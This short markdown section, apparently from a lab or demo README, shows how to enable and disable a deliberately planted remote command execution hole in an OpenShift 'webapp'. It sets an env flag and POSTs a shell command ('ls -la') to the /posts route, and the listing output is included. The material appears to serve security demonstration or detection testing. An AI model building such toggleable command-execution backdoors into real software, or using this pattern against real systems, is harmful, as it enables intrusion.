## Attacking webapp

To activate the RCE, please set the exploit env variable to true

### Activate the RCE
```
oc -n frontend set env deployment/webapp exploit=true

export cmd="ls -la"

curl -X POST -d "cmd=${cmd}" "http://$(oc -n frontend get route/webapp --output jsonpath={.spec.host})"/posts

output: total 0
dr-xr-xr-x.   1 root root  28 Mar  8 08:50 .
dr-xr-xr-x.   1 root root  28 Mar  8 08:50 ..
dr-xr-xr-x.   2 root root   6 Aug  9  2021 afs
lrwxrwxrwx.   1 root root   7 Aug  9  2021 bin -> usr/bin
dr-xr-xr-x.   2 root root   6 Aug  9  2021 boot
drwxr-xr-x.   5 root root 360 Mar  8 08:50 dev
drwxr-xr-x.   1 root root  53 Mar  8 08:50 etc
drwxr-xr-x.   2 root root   6 Aug  9  2021 home
lrwxrwxrwx.   1 root root   7 Aug  9  2021 lib -> usr/lib
lrwxrwxrwx.   1 root root   9 Aug  9  2021 lib64 -> usr/lib64
drwxr-xr-x.   2 root root   6 Aug  9  2021 media
drwxr-xr-x.   2 root root   6 Aug  9  2021 mnt
drwxr-xr-x.   2 root root   6 Aug  9  2021 opt
dr-xr-xr-x. 229 root root   0 Mar  8 08:50 proc
dr-xr-x---.   3 root root  23 Feb 22 13:56 root
drwxr-xr-x.   1 root root  42 Mar  8 08:50 run
lrwxrwxrwx.   1 root root   8 Aug  9  2021 sbin -> usr/sbin
drwxr-xr-x.   2 root root   6 Aug  9  2021 srv
dr-xr-xr-x.  13 root root   0 Mar  1 10:33 sys
drwxrwxrwt.   2 root root   6 Aug  9  2021 tmp
drwxr-xr-x.   1 root root  17 Feb 22 13:55 usr
drwxr-xr-x.  17 root root 219 Feb 22 13:55 var
```

### Deactivate the RCE

```
oc -n frontend set env deployment/webapp exploit-

export cmd="ls -la"

curl -X POST -d "cmd=${cmd}" "http://$(oc -n frontend get route/webapp --output jsonpath={.spec.host})"/posts

exploit is not enabled
```
